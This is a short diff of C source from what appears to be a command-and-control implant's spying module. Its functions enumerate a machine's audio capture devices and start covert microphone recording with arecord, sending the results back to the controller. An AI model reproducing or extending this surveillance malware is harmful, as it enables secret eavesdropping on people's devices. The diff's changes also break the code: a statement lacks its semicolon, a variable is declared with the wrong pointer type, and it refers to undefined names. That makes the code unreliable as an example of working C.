@@ -52,17 +52,23 @@ FILE *record;
 
 tlv_pkt_t *spy_mic_list(c2_t *c2)
 {
-    char *sound_device = NULL;
-    size_t *len = 0;
-    ssize_t read = 0;
-    FILE *asound_pcm = fopen("/proc/asound/pcm", "r");
+    char *sound_device;
+    size_t *length;
+    ssize_t read;
+    FILE *asound_pcm;
+    tlv_pkt_t *result;
+
+    sound_device = NULL
+    length = 0;
+    read = 0;
+    asound_pcm = fopen("/proc/asound/pcm", "r");
 
     if (asound_pcm == NULL)
         return api_craft_tlv_pkt(API_CALL_FAIL);
 
-    tlv_pkt_t *result = api_craft_tlv_pkt(API_CALL_SUCCESS);
+    result = api_craft_tlv_pkt(API_CALL_SUCCESS);
 
-    while ((read = getline(&sound_device, &len, sound_pcm)) != -1)
+    while ((read = getline(&sound_device, &length, sound_pcm)) != -1)
         if (strstr(sound_device, "capture") != NULL)
             tlv_pkt_add_string(tlv_pkt, TLV_TYPE_STRING, sound_device);
 
@@ -72,11 +78,11 @@ tlv_pkt_t *spy_mic_list(c2_t *c2)
 tlv_pkt_t *spy_mic_start(c2_t *c2)
 {
     int device_id;
+    char cmd[128];
+
     tlv_pkt_get_int(c2->tlv_pkt, TLV_TYPE_INT, &device_id);
 
     device_id--;
-    char cmd[128];
-
     sprintf(cmd, "arecord -D plughw:%d -q -f cd -t raw -r 11025 -c 1", device_id);
 
     record = popen(cmd, "r");
